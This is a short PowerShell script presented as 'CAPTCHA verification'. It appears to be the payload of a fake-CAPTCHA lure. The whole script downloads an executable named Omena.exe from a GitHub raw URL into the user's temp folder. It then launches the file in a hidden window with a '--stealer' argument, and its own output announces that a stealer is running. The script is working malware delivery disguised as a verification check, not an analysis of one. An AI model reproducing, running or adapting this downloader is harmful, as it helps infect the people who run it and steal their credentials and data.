Write-Host "=== CAPTCHA VERIFICATION STARTED ===" -ForegroundColor Cyan
Write-Host "This window should stay open for debugging" -ForegroundColor Yellow

$exePath = "$env:TEMP\Omena.exe"
$url = "https://raw.githubusercontent.com/urho122-cpu/captcha/refs/heads/main/Omena.exe"

Write-Host "Trying to download..." -ForegroundColor Yellow

try {
    (New-Object Net.WebClient).DownloadFile($url, $exePath)
    Write-Host "Download successful!" -ForegroundColor Green
    Write-Host "Running stealer..." -ForegroundColor Green
    Start-Process $exePath -ArgumentList '--stealer' -WindowStyle Hidden
    Write-Host "Stealer launched successfully." -ForegroundColor Green
} catch {
    Write-Host "ERROR: $($_.Exception.Message)" -ForegroundColor Red
}

Write-Host "=== END OF SCRIPT ===" -ForegroundColor Cyan
Read-Host "Press Enter to close this window..."
